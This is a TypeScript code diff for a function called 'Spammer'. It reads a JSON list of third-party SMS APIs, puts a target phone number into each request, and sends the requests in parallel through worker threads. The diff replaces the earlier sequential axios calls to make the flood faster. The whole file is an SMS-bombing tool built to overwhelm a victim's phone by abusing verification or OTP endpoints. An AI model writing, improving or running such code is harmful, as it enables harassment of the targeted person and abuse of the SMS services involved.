@@ -1,37 +1,29 @@
-import axios from "axios"
 import * as smsApiData from "./smsApi.json"
-import { error } from "console"
-
-async function sendRequest(
-  url : string,
-  method : string,
-  headers : {[key : string]  : string},
-  data : any
-) {
-  switch (method.toLowerCase()) {
-    case "get":
-      return await axios.get(url, {
-        headers
-      })
-    case "post":
-      return await axios.post(url, data, {
-        headers
-      })
-    default:
-      throw error("invalid method")
-  }
-}
+import {Worker} from "worker_threads"
 
 export async function Spammer(target : number) {
+   const workers : Array<Worker> = [];
   for (let key in smsApiData) {
+
     if (key === "default") continue
+
+    const apiData = smsApiData[key];
+
+    const url = apiData.url.replace("${target}" , target);
+    const method = apiData.method;
+    const headers = JSON.parse(JSON.stringify(apiData.headers).replace("${target}" , target.toString()));
+    const data = JSON.parse(JSON.stringify(apiData.data).replace("${target}" , target.toString()));
     
-    const apiData = smsApiData[key]
-    await sendRequest(
-      apiData.url.replace("${target}" , target),
-      apiData.method,
-      JSON.parse(JSON.stringify(apiData.headers).replace("${target}" , target.toString())),
-      JSON.parse(JSON.stringify(apiData.data).replace("${target}" , target.toString()))
-    )
+    const worker : Worker = new Worker('/worker.js' , {workerData: {
+     url , method , headers , data
+    }})
+    workers.push(worker);
   }
+  await Promise.all(workers.map((worker) => new Promise((resolve, reject) => {
+    worker.on("message", resolve);
+    worker.on("error", reject);
+    worker.on("exit", (code) => {
+      if (code !== 0) reject(new Error(`Worker stopped with exit code ${code}`));
+    });
+  })));
 }
